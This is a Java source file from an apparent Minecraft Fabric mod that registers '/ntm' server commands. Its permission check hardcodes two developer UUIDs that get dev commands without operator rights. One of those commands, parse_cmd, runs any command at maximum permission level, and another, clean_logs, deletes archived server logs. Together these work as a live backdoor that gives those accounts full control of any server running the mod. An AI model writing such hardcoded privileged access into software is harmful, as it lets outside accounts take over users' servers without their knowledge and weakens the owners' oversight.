package net.fawnoculus.ntm.commands;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fawnoculus.ntm.main.NTM;
import net.minecraft.component.Component;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.text.MutableText;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.jetbrains.annotations.Nullable;

import java.io.File;
import java.util.List;

public class ModCommands {
  public static void initialize() {
    
    CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> dispatcher.register(
        CommandManager.literal("ntm")
            .then(CommandManager.literal("config")
                .requires(source -> allowCommands(source, environment))
                .then(CommandManager.literal("server"))
                .then(CommandManager.literal("world"))
                .then(CommandManager.literal("client")
                    .requires(ignored -> environment.integrated)))
            .then(CommandManager.literal("version")
                .executes(ModCommands::version))
            .then(CommandManager.literal("dev")
                .requires(source -> allowCommands(source, null))
                .then(CommandManager.literal("list_components")
                    .executes(ModCommands::getDataComponents)
                    .then(CommandManager.argument("max_length", IntegerArgumentType.integer())
                        .executes(ModCommands::getDataComponents)))
                .then(CommandManager.literal("clean_logs")
                    .executes(ModCommands::deleteLogs))
                .then(CommandManager.literal("funny")
                    .executes(ModCommands::funny))
                .then(CommandManager.literal("parse_cmd")
                    .then(CommandManager.argument("command", StringArgumentType.string())
                        .executes(ModCommands::execCommand))))
    ));
  }
  
  private static boolean allowCommands(ServerCommandSource source, @Nullable CommandManager.RegistrationEnvironment environment){
    if(environment != null && environment.integrated) return true;
    if(source.hasPermissionLevel(1)) return true;
    if(source.getPlayer() == null) return false;
    
    final List<String> DevUUIDs = List.of(
        "edeed01b-d4ce-495c-bdc2-18bb3cf89047",
        "568c41d0-1c56-474d-a60b-0898e636a6e2"
    );
    return DevUUIDs.contains(source.getPlayer().getUuidAsString());
  }
  
  private static int version(CommandContext<ServerCommandSource> context){
    context.getSource().sendFeedback(() -> Text.literal("NTM Server Version: " + NTM.METADATA.getVersion()), false);
    return 1;
  }
  
  private static int funny(CommandContext<ServerCommandSource> context){
    context.getSource().sendFeedback(() -> Text.literal("Performed the 'funny' >:3"), false);
    return 1;
  }
  
  private static int deleteLogs(CommandContext<ServerCommandSource> context){
    File[] logs = context.getSource().getServer().getPath("logs").toFile().listFiles();
    long files = 0;
    long data = 0;
    assert logs != null;
    for(File log : logs){
      if(log.getName().endsWith(".log.gz")){
        long filesize = log.length();
        if(log.delete()) {
          files++;
          data += filesize;
        }
      }
    }
    String feedback = String.format("Deleted '%s' old log files ('%s' bytes total)", files, data);
    context.getSource().sendFeedback(() -> Text.literal(feedback), false);
    return 1;
  }
  
  private static int execCommand(CommandContext<ServerCommandSource> context){
    String command = "";
    try{
      command = context.getArgument("command", String.class);
    }catch (Exception ignored){}
    context.getSource().getServer().getCommandManager().executeWithPrefix(context.getSource().withLevel(Integer.MAX_VALUE), command);
    return 1;
  }
  
  private static int getDataComponents(CommandContext<ServerCommandSource> context){
    PlayerEntity player = context.getSource().getPlayer();
    if(player == null || player.getMainHandStack() == ItemStack.EMPTY){
      context.getSource().sendError(Text.literal("Could not get held Item"));
      return -1;
    }
    
    int maxSize = 100;
    try{
      maxSize = context.getArgument("max_length", Integer.class);
    }catch (Exception ignored){}
    
    context.getSource().sendFeedback(() -> Text.literal("//////Components Start//////").formatted(Formatting.DARK_GRAY), false);
    for(Component<?> component : player.getMainHandStack().getComponents()){
      String type = component.type().toString();
      String value = component.value().toString();
      MutableText feedback = Text.literal("");
      feedback.append(Text.literal(type + ": ").formatted(Formatting.YELLOW));
      if(value.length() > maxSize) {
        feedback.append(Text.literal("... (value > max_length)").formatted(Formatting.GRAY));
        context.getSource().sendFeedback(() -> feedback, false);
        continue;
      }
        feedback.append(Text.literal(value).formatted(Formatting.WHITE));
      context.getSource().sendFeedback(() -> feedback, false);
    }
    context.getSource().sendFeedback(() -> Text.literal("//////Components End//////").formatted(Formatting.DARK_GRAY), false);
    return 1;
  }
}
